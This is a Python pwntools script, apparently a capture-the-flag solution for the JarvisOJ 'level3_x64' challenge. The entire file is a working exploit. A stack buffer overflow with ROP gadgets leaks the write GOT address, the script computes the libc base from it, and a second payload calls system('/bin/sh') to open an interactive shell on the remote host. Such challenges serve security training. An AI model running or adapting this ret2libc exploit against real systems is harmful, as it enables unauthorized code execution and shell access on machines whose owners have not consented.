from pwn import *

r = remote('pwn2.jarvisoj.com', 9883)
#r = process("./level3_x64")
elf = ELF("./level3_x64")
libc = ELF("./libc-2.19.so")


write_plt = elf.plt['write']
write_got = elf.got['write']
main = elf.symbols["main"]
write_libc = libc.symbols['write']
sys_libc = libc.symbols['system']
bin_libc = libc.search("/bin/sh").next()
pop_rdi = 0x4006b3
pop_rsi = 0x4006b1 


r.recvuntil("Input:\n")
pay = 'a' * 0x88 + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(write_got) + p64(0) +p64(write_plt) + p64(main)
r.sendline(pay)
xx = u64(r.recv(8))
print hex(xx)


libc_add = xx - write_libc
sys_add = libc_add + sys_libc
bin_add = libc_add + bin_libc
r.recvuntil("Input:\n")
pay = 'a' * 0x88 + p64(pop_rdi) + p64(bin_add) +p64(sys_add) + p64(main)
r.sendline(pay)
r.interactive()
